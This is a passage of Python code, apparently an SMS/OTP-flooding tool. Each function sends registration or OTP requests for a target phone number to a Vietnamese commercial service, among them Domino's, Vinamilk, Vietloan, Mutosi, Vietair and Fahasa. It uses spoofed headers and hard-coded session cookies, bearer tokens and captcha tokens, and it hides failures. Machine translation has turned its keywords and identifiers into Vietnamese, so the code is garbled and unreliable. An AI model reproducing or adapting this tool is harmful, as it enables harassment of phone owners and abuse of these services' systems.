        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng nguồn gốc',
        'bí mật': 'bPG0upAJLk0gz/2W1baS2Q==',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    dữ liệu json = {
        'số_điện_thoại': sdt,
        'email': 'rancellramseyis792@gmail.com',
        'loại': 0,
        'is_register': Đúng,
    }

    # Thử lại cấu hình với Retry và HTTPAdapter
    retry_strategy = Thử lại(
        tổng cộng=3,
        trạng thái_lực_danh_sách=[429, 500, 502, 503, 504],
        phương_pháp_cho_phép=["HEAD", "GET", "TÙY CHỌN", "POST"],
        hệ số lùi lại = 1
    )
    bộ điều hợp = HTTPAdapter(max_retries=chiến lược thử lại)
    http = yêu cầu. Phiên()
    http.mount("https://", bộ điều hợp)
    http.mount("http://", bộ điều hợp)

    thử:
        phản hồi = http.post('https://dominos.vn/api/v1/users/send-otp', headers=headers, json=json_data, timeout=10, stream=False)
        reply.raise_for_status() # Đảm bảo rằng mọi lỗi HTTP đều được nâng cấp
        
    ngoại trừ requests.exceptions.ChunkedEncodingError:
        vượt qua
    ngoại trừ requests.exceptions.RequestException như e:
        vượt qua


def send_otp_via_vinamilk(sdt):
    tiêu đề = {
        'chấp nhận': '*/*',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'ủy quyền': 'Người mang null',
        'content-type': 'text/plain;charset=UTF-8',
        'dnt': '1',
        'nguồn gốc': 'https://new.vinamilk.com.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://new.vinamilk.com.vn/account/register',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng nguồn gốc',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    dữ liệu = f'{{"type":"register","phone":"{sdt}"}}'

    phản hồi = yêu cầu.post('https://new.vinamilk.com.vn/api/account/getotp', headers=headers, data=data)
    


def send_otp_via_vietloan2(sdt):
    bánh quy = {
    '_fbp': 'fb.1.1720102725444.358598086701375218',
    '_gcl_au': '1.1.619229570.1720102726',
    'mousestats_vi': 'acaa606972ae539932c0',
    '_tt_enable_cookie': '1',
    '_ttp': 'tGf0fClVBAWb7n4wsYwyYbdPx5W',
    '_ym_uid': '1720102728534641572',
    '_ym_d': '1720102728',
    '_gid': 'GA1.2.557208002.1720622172',
    '_clck': '14x7a16%7C2%7Cfnc%7C0%7C1646',
    '_ym_isad': '2',
    '__cfruid': '92805d7d62cc6333c3436c959ecc099040706b4f-1720628273',
    '_ym_visorc': 'v',
    'XSRF-TOKEN': 'eyJpdiI6IjJUcUxmYUFZY3ZGR3hFVFFGS2QybkE9PSIsInZhbHVlIjoidWVYSDZTZmVKOWZ0MFVrQnJ0VHFMOUZEdkcvUXZtQzBsTUhPRXg2Z0FWejV0U3grbzVHUUl6TG13Z09PWjhMQURWN0pkRFl4bzI3Nm9nQTdFUm5HTjN 2TFd2NkExTlQ5RjUwZ1hGZEpDaUFDUTkxRVpwRzdTdWhoVElNRVYvbzgiLCJtYWMiOiI0ZTU0MWY5ZDI2NGI3M mU3ZGQwMDizMjNiYjJjZDUyZjIzNjdkZjc0ODFhNWVkMTdhZWQ0NTJiNDgxY2ZkMDczIiwidGFnIjoiIn0%3D',
    'sessionid': 'eyJpdiI6InBWUDRIMVE1bUNtTk5CN0htRk4yQVE9PSIsInZhbHVlIjoiMGJwSU1VOER4ZnNlSCt1L0Vjckp0akliMWZYd1lXaU01K08ybXRYOWtpb2theFdzSzBENnVzWUdmczFQNzN1YU53Uk1hUk1lZWVYM25sQ0ZwbytEQld GcCthdUR4S29sVHI3SVRKcEZHRndobTlKcWx2QVlCejJPclc1dkU1bmciLCJtYWMiOiJiOTliN2NkNmY5ZDFkN TZlN2VhODg3NWIxMmEzZmVlNzRmZjU1ZGFmZWYxMzI0ZWYwNDNmMWZmMDljNmMzZDdhIiwidGFnIjoiIn0%3D',
    'utm_uid': 'eyJpdiI6IlFPQ2UydEhQbC8zbms5ZER4M2t5WWc9PSIsInZhbHVlIjoiaWlBdVppVG9QRjhEeVJDRmhYUGUvRWpMMzNpZHhTY1czTWptMDYvK2VERVFhYzFEaDV1clJBczZ2VzlOSW1YR3dVMDRRUHNYQkMvYWRndS9Kekl5Kzh lNU1Xblk5NHVjdmZEcjRKNVE5RXI3cnp0MzJSd3hOVVYyTHNMMDZuT0UiLCJtYWMiOiIyOGVmNGM1NmIyZmZlN TMzZmI5OWIxYzI2NjI3Yzg2Yjg0YTAwODMxMjlkMDE0ZTU3MjVmZTViMjc5MDM1YTE4IiwidGFnIjoiIn0%3D',
    '_ga': 'GA1.2.1882430469.1720102726',
    'ec_png_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'ec_png_client': 'sai',
    'ec_png_client_utm': 'không',
    'ec_cache_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'ec_cache_client': 'sai',
    'ec_cache_client_utm': 'null',
    'ec_etag_client': 'sai',
    'ec_etag_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'ec_etag_client_utm': 'null',
    '_clsk': '1kt5hyl%7C1720628299918%7C2%7C1%7Cx.clarity.ms%2Fthu thập',
    '_ga_EBK41LH7H5': 'GS1.1.1720622171.4.1.1720628300.41.0.0',
    'uid': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'khách hàng': 'sai',
    'client_utm': 'null',
    }

    tiêu đề = {
    'chấp nhận': '*/*',
    'chấp nhận-ngôn ngữ': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'kiểm soát bộ nhớ đệm': 'không có bộ nhớ đệm',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_fbp=fb.1.1720102725444.358598086701375218; _gcl_au=1.1.619229570.1720102726; mousestats_vi=acaa606972ae539932c0; _tt_enable_cookie=1; _ttp=tGf0fClVBAWb7n4wsYwyYbdPx5W; _ym_uid=1720102728534641572; _ym_d=1720102728; _gid=GA1.2.557208002.1720622172; _clck=14x7a16%7C2%7Cfnc%7C0%7C1646; _ym_isad=2; __cfruid=92805d7d62cc6333c3436c959ecc099040706b4f-1720628273; _ym_visorc=w; XSRF-TOKEN=eyJpdiI6IjJUcUxmYUFZY3ZGR3hFVFFGS2QybkE9PSIsInZhbHVlIjoidWVYSDZTZmVKOWZ0MFVrQ nJ0VFMOUZEdkcvUXZtQzBsTUhPRXg2Z0FWejV0U3grbzVHUul6TG13Z09PWjhMQURWN0pkRFl4bzI3Nm9nQTdFUm 5HTjN2TFd2NkExTlQ5RjUwZ1hGZEpDaUFDUTkxRVpwRzdTdWhoVElNRVYvbzgiLCJtYWMiOiI0ZTU0MWY5ZDI2NG I3MmU3ZGQwMDizMjNiYjJjZDUyZjIzNjdkZjc0ODFhNWVkMTdhZWQ0NTJiNDgxY2ZkMDczIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6InBWUDRIMVE1bUNtTk5CN0htRk4yQVE9PSIsInZhbHVlIjoiMGJwSU1VOER4ZnNlSCt1L0Vjckp0akliMWZYd1lXaU01K08ybXRYOWtpb2theFdzSzBENnVzWUdmczFQNzN1YU53Uk1hUk1lZWVYM25sQ0Zwby tEQldGcCthdUR4S29sVHI3SVRKcEZHRndobTlKcWx2QVlCejJPclc1dkU1bmciLCJtYWMiOiJiOTliN2NkNmY5ZD FkNTZlN2VhODg3NWIxMmEzZmVlNzRmZjU1ZGFmZWYxMzI0ZWYwNDNmMWZmMDljNmMzZDdhIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IlFPQ2UydEhQbC8zbms5ZER4M2t5WWc9PSIsInZhbHVlIjoiaWlBdVppVG9QRjhEeVJDRmhYUGUvRWpMMzNpZHhTY1czTWptMDYvK2VERVFhYzFEaDV1clJBczZ2VzlOSW1YR3dVMDRRUHNYQkMvYWRndS9Kekl 5KzhlNU1Xblk5NHVjdmZEcjRKNVE5RXI3cnp0MzJSd3hOVVYyTHNMMDZuT0UiLCJtYWMiOiIyOGVmNGM1NmIyZmZ lNTMzZmI5OWIxYzI2NjI3Yzg2Yjg0YTAwODMxMjlkMDE0ZTU3MjVmZTViMjc5MDM1YTE4IiwidGFnIjoiIn0%3D; _ga=GA1.2.1882430469.1720102726; ec_png_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_png_client=false; ec_png_client_utm=null; ec_cache_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_cache_client=false; ec_cache_client_utm=null; ec_etag_client=false; ec_etag_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_etag_client_utm=null; _clsk=1kt5hyl%7C1720628299918%7C2%7C1%7Cx.clarity.ms%2Fthu thập; _ga_EBK41LH7H5=GS1.1.1720622171.4.1.1720628300.41.0.0; uid=12044e63-ea79-83c1-269a-86ba3fc88165; máy khách=sai; máy khách_utm=null',
    'nguồn gốc': 'https://vietloan.vn',
    'pragma': 'không có bộ nhớ đệm',
    'ưu tiên': 'u=1, i',
    'người giới thiệu': 'https://vietloan.vn/register',
    'sec-ch-ua': '"Không phải/Một) Thương hiệu";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'trống',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cùng nguồn gốc',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    }

    dữ liệu = {
    'điện thoại': sdt,
    '_token': '0fgGIpezZElNb6On3gIr9jwFGxdY64YGrF8bAeNU',
    }

    phản hồi = yêu cầu.post('https://vietloan.vn/register/phone-resend', cookies=cookies, headers=headers, data=data)

def send_otp_via_batdongsan(sdt):
    tiêu đề = {
        'chấp nhận': 'ứng dụng/json, văn bản/thuần túy, */*',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        # 'cookie': 'con.unl.lat=1722272400; con.unl.sc=1; g_state={"i_p":1722365115669,"i_l":1}; con.unl.usr.id=%7B%22key%22%3A%22userId%22%2C%22value%22%3A%222f8373e2-be24-412f-8c43-163568d0f3d4%22%2C%22expireDate%22%3A%222025-07-30T23%3A45%3A15.4546279Z%22%7D; con.unl.cli.id=%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%22d0efffb9-6e29-4b3f- 8d35-077a9bd5edbe%22%2C%22expireDate%22%3A%222025-07-30T23%3A45%3A15.4547012Z%22%7D; ab.storage.deviceId.2dca22f5-7d0d-4b29-a49e-f61ef2edc6e9=%7B%22g%22%3A%22d0d2a10b-fa 24-7e47-5a09-26e1aadf8015%22%2C%22c%22%3A1722357926566%2C%22l%22%3A1722357926566%7D; _cfuvid=gviR7OYgIOmdyT7s0ARpMy95ecrZEcqyEJQQ8ON1j0A-1722438792768-0.0.1.1-604800000; cf_clearance=8kuq88Bui2ZQp3xMbu6IS8E_J6DRNIzlj.i84sS9eec-1722439989-1.0.1.1-MDtjaMwRII2EZ70WMiAg_w5s4z1uVtSRFE84bQHiHWH6mqpBKpxBqfDTc4i5Q4nxWcK8FLxgtbBzpbuIwQW2gA',
        'dnt': '1',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://batdongsan.com.vn/sellernet/internal-sign-up',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng nguồn gốc',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    tham số = {
        'số điện thoại': sdt,
    }

    phản hồi = yêu cầu.get(
        'https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister',
        params=tham số,
        headers=tiêu đề,
    )
    



def send_otp_via_GUMAC(sdt):
    tiêu đề = {
        'Chấp nhận': 'application/json',
        'Ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'Kết nối': 'duy trì kết nối',
        'Loại nội dung': 'ứng dụng/json',
        'DNT': '1',
        'Nguồn gốc': 'https://gumac.vn',
        'Người giới thiệu': 'https://gumac.vn/',
        'Sec-Fetch-Dest': 'trống',
        'Chế độ lấy giây': 'cors',
        'Sec-Fetch-Site': 'cùng một trang web',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    dữ liệu json = {
        'điện thoại': sdt,
    }

    phản hồi = yêu cầu.post('https://cms.gumac.vn/api/v1/customers/verify-phone-number', headers=headers, json=json_data)
    



def send_otp_via_mutosi(sdt):
    tiêu đề = {
        'Chấp nhận': 'application/json, text/plain, */*',
        'Ngôn ngữ chấp nhận': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Ủy quyền': 'Người mang 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
        'Kiểm soát bộ nhớ đệm': 'không có bộ nhớ đệm',
        'Kết nối': 'duy trì kết nối',
        'Loại nội dung': 'ứng dụng/json',
        'Nguồn gốc': 'https://mutosi.com',
        'Pragma': 'không có bộ nhớ đệm',
        'Người giới thiệu': 'https://mutosi.com/',
        'Sec-Fetch-Dest': 'trống',
        'Chế độ lấy giây': 'cors',
        'Sec-Fetch-Site': 'cùng một trang web',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/126.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Không phải/Một) Thương hiệu";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    dữ liệu json = {
        'tên': 'hà kiến',
        'điện thoại': sdt,
        'mật khẩu': 'Vjyy1234@',
        'xác nhận_mật khẩu': 'Vjyy1234@',
        'firstname': Không có,
        'họ': Không có,
        'xác minh_otp': 0,
        'store_token': '226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
        'email': 'dđ@gmail.com',
        'sinh nhật': '2006-02-13',
        'chấp nhận các điều khoản': 1,
        'nhận_khuyến_mại': 1,
    }

    thử:
        phản hồi = yêu cầu.post('https://api-omni.mutosi.com/client/auth/register', tiêu đề=tiêu đề, json=json_data)
        response.raise_for_status() # Đưa ra lỗi cho mã trạng thái HTTP không hợp lệ
        # In phản hồi JSON
    ngoại trừ requests.exceptions.RequestException như e:
        vượt qua

def send_otp_via_mutosi1(sdt):
    tiêu đề = {
        'Chấp nhận': 'application/json, text/plain, */*',
        'Ngôn ngữ chấp nhận': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Ủy quyền': 'Người mang 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
        'Kiểm soát bộ nhớ đệm': 'không có bộ nhớ đệm',
        'Kết nối': 'duy trì kết nối',
        'Loại nội dung': 'ứng dụng/json',
        'Nguồn gốc': 'https://mutosi.com',
        'Pragma': 'không có bộ nhớ đệm',
        'Người giới thiệu': 'https://mutosi.com/',
        'Sec-Fetch-Dest': 'trống',
        'Chế độ lấy giây': 'cors',
        'Sec-Fetch-Site': 'cùng một trang web',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/126.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Không phải/Một) Thương hiệu";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    dữ liệu json = {
        'điện thoại': sdt,
        'mã thông báo': '03AFcWeA4O6j16gs8gKD9Zvb-gkvoC-kBTVH1xtMZrMmjfODRDkXlTkAzqS6z0cT_96PI4W-sLoELf2xrLnCpN0YvCs3q90pa8Hq52u2dIqknP5o7ZY-5isVxiouDyBbtPsQEzaVdXm0KXmAYPn0K-wy1rKYSAQWm96AVyKw soAlFoWpgFeTHt_-J8cGBmpWcVcmOPg-D4-EirZ5J1cAGs6UtmKW9PkVZRHHwqX-tIv59digmt-KuxGcytzrC iuGqv6Rk8H52tiVzyNTtQRg6JmLpxe7VCfXEqJarPiR15tcxoo1RamCtFMkwesLd39wHBDHxoyiUah0P4NLbq HU1KYISeKbGiuZKB2baetxWItDkfZ5RCWIt5vcXXeF0TF7EkTQt635L7r1wc4O4p1I-vwapHFcBoWSStMOdjQPIokkGGo9EE-APAfAtWQjZXc4H7W3Aaj0mTLpRpZBV0TE9BssughbVXkj5JtekaSOrjrqnU0tKeNOnGv25iCg 11IplsxBSr846YvJxIJqhTvoY6qbpFZymJgFe53vwtJhRktA3jGEkCFRdpFmtw6IMbfgaFxGsrMb2wkl6armSvVyxx9YKRYkwNCezXzRghV8ZtLHzKwbFgA6ESFRoIHwDIRuup4Da2Bxq4f2351XamwzEQnha6ekDE2GJbTw',
        'nguồn': 'web_consumers',
    }

    thử:
        phản hồi = yêu cầu.post('https://api-omni.mutosi.com/client/auth/reset-password/send-phone', tiêu đề=tiêu đề, json=json_data)
        response.raise_for_status() # Đưa ra lỗi cho mã trạng thái HTTP không hợp lệ
    ngoại trừ requests.exceptions.RequestException như e:
        vượt qua






def send_otp_via_vietair(sdt):
    người giới thiệu_url = f'https://vietair.com.vn/khach-hang-than-quen/xac-nhan-otp-dang-ky?sq_id=30149&mobile={sdt}'
    
    bánh quy = {
        '_gcl_au': '1.1.515899722.1720625176',
        '_tt_enable_cookie': '1',
        '_ttp': 't-FL-whNfDCNGHd27aF7syOqRSh',
        '_fbp': 'fb.2.1720625180842.882992170348492798',
        '__zi': '3000.SSZzejyD3jSkdkgYo5SCqJ6U_wE7LLZFVv3duDj7Kj1jqlNsoWH8boBGzBYF0KELBTUwk8y31v8gtBUuYWuBa0.1',
        '_gid': 'GA1.3.1511312052.1721112193',
        '_clck': '1eg7brl%7C2%7Cfni%7C0%7C1652',
        '_ga': 'GA1.1.186819165.1720625180',
        '_ga_R4WM78RL0C': 'GS1.1.1721112192.2.1.1721112216.36.0.0',
    }

    tiêu đề = {
        'chấp nhận': 'ứng dụng/json, văn bản/javascript, */*; q=0.01',
        'chấp nhận-ngôn ngữ': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'kiểm soát bộ nhớ đệm': 'không có bộ nhớ đệm',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'nguồn gốc': 'https://vietair.com.vn',
        'pragma': 'không có bộ nhớ đệm',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': referer_url,
        'sec-ch-ua': '"Không phải/Một) Thương hiệu";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng nguồn gốc',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/126.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    dữ liệu = {
        'op': 'GÓI_HTTP_POST',
        'path_ajax_post': '/service03/sms/get',
        'tên_gói': 'PK_FD_SMS_OTP',
        'tên_đối_tượng': 'INS',
        'P_MOBILE': sdt,
        'P_TYPE_ACTIVE_CODE': 'DANG_KY_NHAN_OTP',
    }

    thử:
        phản hồi = yêu cầu.post('https://vietair.com.vn/Handler/CoreHandler.ashx', cookie=cookies, headers=headers, data=data)
        response.raise_for_status() # Đưa ra lỗi cho mã trạng thái HTTP không hợp lệ
         # In phản hồi JSON
    ngoại trừ requests.exceptions.RequestException như e:
        vượt qua



def send_otp_via_FAHASA(sdt):
    bánh quy = {
        'giao diện người dùng': '173c6828799e499e81cd64a949e2c73a',
        'frontend_cid': '7bCDwdDzwf8wpQKE',
    }

    tiêu đề = {
        'chấp nhận': 'ứng dụng/json, văn bản/javascript, */*; q=0.01',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; bộ ký tự=UTF-8',
        # 'cookie': 'frontend=173c6828799e499e81cd64a949e2c73a; frontend_cid=7bCDwdDzwf8wpQKE',
        'dnt': '1',
        'nguồn gốc': 'https://www.fahasa.com',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://www.fahasa.com/customer/account/login/referer/aHR0cHM6Ly93d3cuZmFoYXNhLmNvbS9jdXN0b21lci9hY2NvdW50L2luZGV4Lw,,/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng nguồn gốc',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    dữ liệu = {
        'điện thoại': sdt,
    }

    phản hồi = yêu cầu.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', cookie=cookies, headers=headers, data=data)
   

def send_otp_via_hopiness(sdt):
    tiêu đề = {
        'Chấp nhận': '*/*',
        'Ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'Kết nối': 'duy trì kết nối',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'DNT': '1',
        'Nguồn gốc': 'https://shopiness.vn',
        'Người giới thiệu': 'https://shopiness.vn/',
        'Sec-Fetch-Dest': 'trống',
        'Chế độ lấy giây': 'cors',
        'Sec-Fetch-Site': 'cùng nguồn gốc',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'X-Yêu cầu-Với': 'XMLHttpRequest',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    dữ liệu = {
        'hành động': 'xác minh-thông-tin-đăng-ký',
        'số điện thoại': sdt,
        'refCode': '',
    }

    phản hồi = yêu cầu.post('https://shopiness.vn/ajax/user', headers=headers, data=data)
    




def send_otp_via_modcha35(sdt):

    url = "https://v2sslapimocha35.mocha.com.vn/ReengBackendBiz/genotp/v32"

    tải trọng = f"clientType=ios&countryCode=VN&device=iPhone15%2C3&os_version=iOS_17.0.2&platform=ios&revision=11224&username={sdt}&version=1.28"

    tiêu đề = {
    'User-Agent': "mocha/1.28 (iPhone; iOS 17.0.2; Scale/3.00)",
    'Content-Type': "ứng dụng/x-www-form-urlencoded",
    'uuid': "B4DD9661-2B0B-418F-B953-6AE71C0373EC",
    'TÊN ỨNG DỤNG': "MC35",
    'mocha-api': "",
    'countryCode': "VN",
    'Mã ngôn ngữ': "vi",
    'Ngôn ngữ chấp nhận': "vi-VN;q=1"
    }

    phản hồi = yêu cầu.post(url, dữ liệu=tải trọng, tiêu đề=tiêu đề)
    


def send_otp_via_Bibabo(sdt):

    url = "https://one.bibabo.vn/api/v1/login/otp/createOtp"

    tham số = {
    'điện thoại': sdt,
    'reCaptchaToken': "không xác định",
    'appId': "7",
    'phiên bản': "2"
    }

    tiêu đề = {
    'Tác nhân người dùng': "bibabo/522 CFNetwork/1474 Darwin/23.0.0",
    'Chấp nhận': "application/json, text/plain, */*",
    'chấp nhận-ngôn ngữ': "vi-VN,vi;q=0.9"
    }

    phản hồi = yêu cầu.get(url, params=params, headers=headers)

    



def send_otp_via_MOCA(sdt):
    url = "https://moca.vn/moca/v2/users/role"

    tham số = {
    'số điện thoại': sdt
    }

    tiêu đề = {
    'User-Agent': "Pass/2.10.156 (iPhone; iOS 17.0.2; Scale/3.00)",
    'tóm tắt': "SHA-256=cgvOMMsYWgehDVly4KtMMT3F10WQDyMiQT05/hL5YhE=",
    'x-mof-ods': "{chiều dài=32,byte=0x993b85c77b262672a287bb24b56259ca...61966184262e193f}",
    'x-mof-ds': "{chiều dài=32,byte=0x993b85c77b262672a287bb24b56259ca...61966184262e193f}",
    'mã thông báo thiết bị': "4ADAF544-AB6D-4B7F-985A-BF6DAEAA38EA",
    'x-requested-with': "Yêu cầu XMLHttp",
    'device-id': "b51fb1bf16bd391f0b22e68ebf9efb3966acecfc0d587a91031b504754e312f1",
    'chấp nhận-ngôn ngữ': "vi",
    'x-moca-api-version': "2",
    'nền tảng': "P_IOS-2.10.156",
    'ngày': "Thứ năm, ngày 01 tháng 8 năm 2024 13:15:05 GMT",
    'x-request-id': "4ADAF544-AB6D-4B7F-985A-BF6DAEAA38EA1722518105.413269",
    'ủy quyền trước': "hmac username=\"06b707de-6050-11eb-ae93-0242ac130002\", algorithm=\"hmac-sha256\", headers=\"date digest\", signature=\"cZevTUC0yW+WSAVer9McsgpV79XoaL+BTnocoHuzBjw=\""
    }

    phản hồi = yêu cầu.get(url, params=params, headers=headers)

    


def send_otp_via_pantio(sdt):
    tiêu đề = {
        'chấp nhận': '*/*',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'dnt': '1',
        'nguồn gốc': 'https://pantio.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://pantio.vn/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    tham số = {
        'tên miền': 'pantiofashion.myharavan.com',
    }

    dữ liệu = {
        'số điện thoại': sdt,
    }

    phản hồi = yêu cầu.post('https://api.suplo.vn/v1/auth/customer/otp/sms/generate', params=params, headers=headers, data=data)

    


def send_otp_via_Routine(sdt):

    tiêu đề = {
        'chấp nhận': 'ứng dụng/json, văn bản/javascript, */*; q=0.01',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'form_key=1hDuKB6LPnlgEOgn; wp_ga4_customerGroup=KHÔNG ĐĂNG NHẬP; X-Magento-Vary=7ad851671356eb8fbf873fbdb216dde0a2e0c003; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; mage-messages=; form_key=1hDuKB6LPnlgEOgn; private_content_version=e43cc8178a6a71fece0c6db77f4b56d1; PHPSESSID=piouum2lgnbb1usi60h4v29ap9; section_data_ids=%7B%22customer%22%3A1722519971%7D',
        'dnt': '1',
        'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQyMTc2ODQiLCJhcCI6IjExMzQ0MDAwMDciLCJpZCI6IjMzMmYyMzU2YTZlYmEwOWUiLCJ0ciI6ImRkNTQwNTk1ZDY4NWE3MTFjOTNhYjY5NzhkZmY1YTIzIiwidGkiOjE3MjI1MTk5OTE4MDR9fQ==',
        'nguồn gốc': 'https://routine.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://routine.vn/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng nguồn gốc',
        'dấu vết': '00-dd540595d685a711c93ab6978dff5a23-332f2356a6eba09e-01',
        'tracestate': '4217684@nr=0-1-4217684-1134400007-332f2356a6eba09e----1722519991804',
